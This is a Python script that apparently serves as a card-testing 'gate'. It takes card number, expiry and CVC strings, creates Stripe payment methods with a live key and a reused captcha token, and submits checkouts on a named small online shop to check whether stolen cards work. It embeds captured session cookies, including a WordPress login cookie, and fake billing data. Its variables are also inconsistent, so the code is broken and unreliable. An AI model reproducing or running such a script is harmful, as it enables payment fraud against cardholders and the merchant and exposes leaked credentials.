import time
import requests
from fake_useragent import UserAgent
import random
import re
from bs4 import BeautifulSoup
import base64
import asyncio

def Tele(ccx):
    ccx = ccx.strip()
    n = ccx.split("|")[0]
    mm = ccx.split("|")[1]
    yy = ccx.split("|")[2]
    cvc = ccx.split("|")[3]
    
    if "20" in yy:
        yy = yy.split("20")[1]
    
    r = requests.session()
    user_agent          = UserAgent().random
    
    data1 = f'billing_details[name]=Mizzy+shah&billing_details[email]=mizzywasfreak%40gmail.com&billing_details[phone]=&billing_details[address][city]=new+york&billing_details[address][country]=US&billing_details[address][line1]=Mizzy+street%2C+new+york&billing_details[address][line2]=&billing_details[address][postal_code]=10019&billing_details[address][state]=NY&type=card&card[number]={cc}&card[cvc]={cvv}&card[exp_year]={year}&card[exp_month]={mm}&allow_redisplay=unspecified&pasted_fields=number&payment_user_agent=stripe.js%2F2ddc5912fa%3B+stripe-js-v3%2F2ddc5912fa%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Fwww.thekinnardhomestead.com&time_on_page=162869&client_attribution_metadata[client_session_id]=cb5faedc-2fac-483c-a904-7ce8793ff02a&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred&client_attribution_metadata[payment_method_selection_flow]=merchant_specified&guid=0f7640e0-a700-4486-91bb-c7f37931b908fa6a16&muid=477ce344-3e91-487c-8371-c0fc89ce5096982324&sid=8de61d11-4050-4577-87dc-4c2bdf7628559a64ee&key=pk_live_51EYYUxKvxlvSyHpndaKXLtj3JLynxJxOXs5aRIs0dt0u91otL76w8i8DGTkWQCVGkz1QOvn3k182bh5OKi184j9v00f29KK9N1&_stripe_version=2024-06-20&radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwYXNza2V5IjoiR1NWK3BFbEIyNk85eTRDbnVIRy9UUG8ySUxsRlIxSVZ6WUs5UERybnY3TG5RNjhxdVNIN1lOaVJCalkxUmx6TGNIWmV1VmI2ZVA5OXh6bHI0WUVQc1ZmZGIzL2ExSXVTSGZUby8xTGhkWm1TRnVkbXEzTGZodzFIdWI5QVVsWE9FaFp5R1NhQ1FjTE9oc1RINnVwaFAvWGtaZHhIQUcxRm5vQkYvWWREWDVteXk0VGM4U0d1aWRvcU9DK1ROTGJYbTlaVDdkSnE2b2xMTzFPZjlkKzJXRnZhKzhTNHBMZHRabEtkOEZIL0dyVGtJZDB1RE8vMFpDSXRwVE05aW5EZjVXYjdrRHJRYkVhckdBMDNEaFZlVzFmRHk5bSt5VFl6LzdWN0cxRW9SU1k0WWdQek9BY3MwL3FBZE5XU2VJWU5tWGt2ME9nNGcrZVdsYVlEZ0FlTXVGL2lybExqQjUwUzZZTVBZT3pmaTRHMnU5RGt3RHdmNnpiM3ZDL3N6bDlYc0tLZDQ1N2dMOWdlSlpTajZFUWFKMUtlTVFMc3lycTBHWFgwWVQvUVRndW9rd3hWTVE2OTl3VHovamY4QlBpSnVRdHhYMjJoNVFDeHpsK2FCa1JaK2JuNzZGUjRMa3NqWTV4VlRkTDlFLzd3UWc5Q21TazVkQnhFc1hCMTFPSDdrM2hwMkhQTk92SUY0emRDQWhzUkdDeXRnNjBnZzJFd3NPektLNFhWd0k5M3Q1NG9UY2pxMExCOGwrZkxWTDk1Z2Z1WS83MENleXZWTm5ublFOWFJ6T2puMjBMdEs2M3VoUmI4bnk1ME12Q013RGxLUWVHMjhwODFQOUJTVzNla0JIZ1c0bnJyRUhXMnd1TFpmQ3VhWjBpL0pYWFBaVzNsTjVHRnlrUkkvQUFWd0poelZ2clpJSmladzhvSUVsaEQ1WEJTNzlXR29pNmZwVHpOcUVaUDVUVXJNRStVbk5qV2lGL2ZPMWh2R3JrNStuNVFpVmpDcjIxV2ZtN3pjVEcrN3daZ1MyWExzNlQwWFJhNlZmRy9ScVIzVnRHWUhyd1D/Qm41T3hhSWh2ZlByR1dSUnV4ZmxheWNWelRjNXBVYmJQT203QTNhbDVpdWphNEp3RDVncXovbTN1ODZGc1prL29LNmNMdzRMOUNSWmRJZ3cweEprMExhYTZNTzNaN1ZlVStUc2l0NUI2U0RsVWVFa3NHaFpqcmx2ZXBNL2FRMFhvY0c1d04vZjZRbnR3TExYdjhpSURaQjByZEQvMWhOSEtKOWhORzNnUndiSHllLzRyTHhmYWxjdUlnNmtoSmJpeTMwTXlVWTMwVjJtbVFiVGZhQnJjdjYwYm1kRnlXY2NITHkvWGNDSmdOd0VoTzlzN09LTW44eVpucHhvN3pxSWtzL2lpRzdRU1JLekROZGpCYkFCU3QrdTJqd2lZZkZWNWVIbC8ydzdlNUhXMC9INWhaVVl0bTNmRmcwemswS2FsdUhEaGgwTlBSdjF4Qmw0MnJZQ3drc2pXMDM2ZU42cEl3K2JGSGpBaUR0NWJBbHUwMG03MU1acWl0NWs3THl6YlcrSVF0eHlnbGg1SFpTYWxwbmVDZTUycDRPei9tYjVGVytzeldRUkZaMFZKc3ltd3NVQmtUa1VLdlZRK1pWYlo4QnltNU1WVC9hTTh0RldSMzlzejhYTVhvRG9STEdUbDRJYW1ESTF3aUxhSGRlQkpHUDJwK3RnRnpyM0twNmg2ZzdxQWVCZWZicTFTL2VDblFDTXN0Q2taMTFORE5iWEcwNyswSUxibVA1QWlTWVJqVUtWV05WRFhRaDVscUJxMU5EK25KQ3VxMGtEN0ZoaUlCT3dZbjNkY0lDb2pPQ0RBK3FlSEw2UXFYOWZWY2VVaGgyYlVBUlpUN3JjRGdYbmhvSFlFZmNpUkYrQWp5b2JsSWlRbFkyVEtiT2wwcVR1U1FYM0w4OFh2d2J6SnVUc2YzVDdiajNmV3VIMlBnM2FYeGE4dEt1UXNFeS9oQlNUb2tucWg1N3JkTlBiaGJGdzBXOTRqUUpsRUd0UVZOcnJRdng3eGtmMWdZam4zSk85UlkzUk9tMld6T2lyL1JzZE4rM29yaWxFNTBBVVp6aFIxbGpKeGM4VzkzRUlybUhzNXZQdzVnYlFwYXNuaHAyNkNGMTJzRVRndjEwVDljT1BpUnNsaDZzZmpsYUVEenpPbzYvTXY3dDRpTm5YYWhnSkRrOThlQVRSdkpKWkhkQXpZSk5oY05XSnRybURxM3EzS2xCK2ZNYjFOYTZ5NG8yWVpxU3JsYTNhZHpiUzhuVEhEOTlraE02ZWF2Y0c2WUJFRVAvdzgwa3ZDeHRXTGJxZlZjbEU2elc1TEszemFYWTdrVXowSHZUVG53dVExVjl0ejJ4aHJ2OTgxVlA0cHl2TVlMWmx0UGJUZmoxejVGWTFLeFJOZURYUXc5OU1vTXUxeXdVaGhvc3ZpaDNFVzVid1NjTWV3R1gyOGptQ0p5NHpLbVFWN0JYNmNDQnBBclhENFh5ZGlpVFphWjNxUjVJbi9KU2QwQW5seEVlZTNxc21UYVVOQ2w1WWJIUDIwMkJENlVkendQdWFkUm13MC9aYjNneXlHbkorejVRNkc4ZDB4dVAvanl1cnRaZGhEazJjdVV4N2s4aHlDVzBwNk5LVDF2SU9RVzNFdz09IiwiZXhwIjoxNzM3ODE3NjkwLCJzaGFyZF9pZCI6MjU5MTg5MzU5LCJrciI6IjcyNmFjMzMiLCJwZCI6MCwiY2RhdGEiOiJidThTTStpMHoraFY2SHR5Yzg2QXFWc1I4RXpGYmhoN2dGQXI1eHU4VGEwT0RUOXdJb0hMekNxY3FRT3lnMjJDUGU3aXpJempLQTdNSzJBODJmakRiOXRLRHRtV2lMOTBQdzBtOFhOZWRQTVZuLzNZMTI0RlY5dllLVzNrK1Uvdm5IcnNpdXZxckFnbUdFaXV6RlZVSkUvMzlVUEQ0UDh2V2dzSmJhMmN0cEdIVmkyMWhyWkI2ejdPeXZ2bWhRNi9Yck92YjRnT3NmU2wzb0psIn0.l8Rsbig8yYKTft6ksFSNSPg9OLNlGXSSlkY1iGivOiY'

    response1 = requests.post('https://api.stripe.com/v1/payment_methods', data=data1)
    
    try:
        id = response1.json()['id']
    except:
        return response1.json()
        
    print(id)
        
    cookies0 = {
            'tk_or': '%22%22',
             'tk_lr': '%22%22',
             '_ga_DWZF5FYVGZ': 'GS1.1.1737817419.7.1.1737817461.0.0.0',
            '_ga': 'GA1.1.1751235690.1736761478',
            'tk_ai': '%2BD%2BNQMEi5YNkF2FZ2%2F9hbDKt',
            '__stripe_mid': '477ce344-3e91-487c-8371-c0fc89ce5096982324',
            'tk_r3d': '%22%22',
           'tk_qs': '',
           'woocommerce_items_in_cart': '1',
             'woocommerce_cart_hash': 'e5d979fb447403ca5dfe310399035abf',
            'wp_woocommerce_session_a7efc1ffc28f839b6b31f282227ec7a7': 't_6b5885f0ce94730591fb33596a2613%7C%7C1737990257%7C%7C1737986657%7C%7Cd519f339d7f6ab5768d470efe40893bd',
            '__stripe_sid': '8de61d11-4050-4577-87dc-4c2bdf7628559a64ee',
           'sbjs_migrations': '1418474375998%3D1',
             'sbjs_current_add': 'fd%3D2025-01-25%2014%3A34%3A21%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.thekinnardhomestead.com%2Fcheckout%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.thekinnardhomestead.com%2Fproduct%2Fseeds%2F',
            'sbjs_first_add': 'fd%3D2025-01-25%2014%3A34%3A21%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.thekinnardhomestead.com%2Fcheckout%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.thekinnardhomestead.com%2Fproduct%2Fseeds%2F',
           'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
            'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
            'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%3B%20rv%3A134.0%29%20Gecko%2F20100101%20Firefox%2F134.0',
           'sbjs_session': 'pgs%3D1%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.thekinnardhomestead.com%2Fcheckout%2F',
       }

    headers0 =  {
             'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:134.0) Gecko/20100101 Firefox/134.0',
            'Accept': 'application/json',
            'Accept-Language': 'en-US,en;q=0.5',
            'Referer': 'https://js.stripe.com/',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': 'https://js.stripe.com',
            'Connection': 'keep-alive',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-site',
            'Priority': 'u=4',
        }

    response0 = requests.post('https://www.thekinnardhomestead.com/', cookies=cookies0, headers=headers0,)

    nonce = response0.text.split(',"createAndConfirmSetupIntentNonce":"')[1].split('"')[0]
    print(nonce)
    
    cookies = {
    '__stripe_mid': '749cb782-d18f-4e44-949d-fa2ef0b9ae84e59603',
    '__stripe_sid': '25b8c1ba-88b5-4381-a2d9-7cb897aa01cb20f9d2',
    'wt_consent': 'consentid:bVh6aFV5S2E2UmVYbzg2M1RYMGtaODRVRlV6TEszTGI,consent:no,action:yes,necessary:yes,functional:no,analytics:no,performance:no,advertisement:no,others:no,consent_time:1738777649814',
    'wordpress_logged_in_fba2a6933bc7143f3fbecfd01d047118': 'anonymous7l98498%40gmail.com%7C1739987264%7Cre1yiXscN2LbgWID7kT6tbQWgb7cPi0Y8zweNNtGPju%7C9801e0f467848eae0027424df04c88bd0a762c9db7d129dd25f00a537ddba20a',
    'wfwaf-authcookie-fe38f853a278512a342f4c92a9c453bf': '988%7Cother%7Cread%7C5760a9e00a66e89651223bc0f87c427903430f2c8348c8e23fa2c5de06b743d5',
}

    headers = {
           'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:134.0) Gecko/20100101 Firefox/134.0',
           'Accept': 'application/json, text/javascript, */*; q=0.01',
           'Accept-Language': 'en-US,en;q=0.5',
          'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
           'X-Requested-With': 'XMLHttpRequest',
            'Origin': 'https://www.thekinnardhomestead.com',
            'Connection': 'keep-alive',
            'Referer': 'https://www.thekinnardhomestead.com/checkout/',
           'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
        }
    params = {
        'wc-ajax': 'checkout'
    }


    data = f'wc_order_attribution_source_type=typein&wc_order_attribution_referrer=https%3A%2F%2Fwww.thekinnardhomestead.com%2Fproduct%2Fseeds%2F&wc_order_attribution_utm_campaign=(none)&wc_order_attribution_utm_source=(direct)&wc_order_attribution_utm_medium=(none)&wc_order_attribution_utm_content=(none)&wc_order_attribution_utm_id=(none)&wc_order_attribution_utm_term=(none)&wc_order_attribution_utm_source_platform=(none)&wc_order_attribution_utm_creative_format=(none)&wc_order_attribution_utm_marketing_tactic=(none)&wc_order_attribution_session_entry=https%3A%2F%2Fwww.thekinnardhomestead.com%2Fcheckout%2F&wc_order_attribution_session_start_time=2025-01-25+14%3A34%3A21&wc_order_attribution_session_pages=1&wc_order_attribution_session_count=1&wc_order_attribution_user_agent=Mozilla%2F5.0+(Windows+NT+10.0%3B+Win64%3B+x64%3B+rv%3A134.0)+Gecko%2F20100101+Firefox%2F134.0&wc_order_attribution_source_type=typein&wc_order_attribution_referrer=https%3A%2F%2Fwww.thekinnardhomestead.com%2Fproduct%2Fseeds%2F&wc_order_attribution_utm_campaign=(none)&wc_order_attribution_utm_source=(direct)&wc_order_attribution_utm_medium=(none)&wc_order_attribution_utm_content=(none)&wc_order_attribution_utm_id=(none)&wc_order_attribution_utm_term=(none)&wc_order_attribution_utm_source_platform=(none)&wc_order_attribution_utm_creative_format=(none)&wc_order_attribution_utm_marketing_tactic=(none)&wc_order_attribution_session_entry=https%3A%2F%2Fwww.thekinnardhomestead.com%2Fcheckout%2F&wc_order_attribution_session_start_time=2025-01-25+14%3A34%3A21&wc_order_attribution_session_pages=1&wc_order_attribution_session_count=1&wc_order_attribution_user_agent=Mozilla%2F5.0+(Windows+NT+10.0%3B+Win64%3B+x64%3B+rv%3A134.0)+Gecko%2F20100101+Firefox%2F134.0&billing_first_name=Mizzy&billing_last_name=shah&billing_address_1=Mizzy+street%2C+new+york&billing_address_2=&billing_city=new+york&billing_state=NY&billing_postcode=10019&billing_country=US&billing_email=mizzywasfreak%40gmail.com&billing_phone=&account_password=&shipping_first_name=&shipping_last_name=&shipping_address_1=&shipping_address_2=&shipping_city=&shipping_state=AR&shipping_postcode=&shipping_country=US&order_comments=&quantity=1&shipping_method%5B0%5D=wc_pickup_store&shipping_pickup_stores=Crystal+Hill+Commuter+Lot&shipping_by_store=0&payment_method=stripe&wc-stripe-payment-method-upe=&wc_stripe_selected_upe_payment_type=&wc-stripe-is-deferred-intent=1&mailpoet_woocommerce_checkout_optin_present=1&mailpoet_woocommerce_checkout_optin_present=1&terms=on&terms-field=1&woocommerce-process-checkout-nonce=5f2b56d290&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review&wc-stripe-payment-method={new_pm_key}'

    response = requests.post('https://www.thekinnardhomestead.com/', params=params, cookies=cookies, headers=headers, data=data)

    try:
        return response.json()
    except:
        return 'Gate Dead or Found Error in Gate', response.text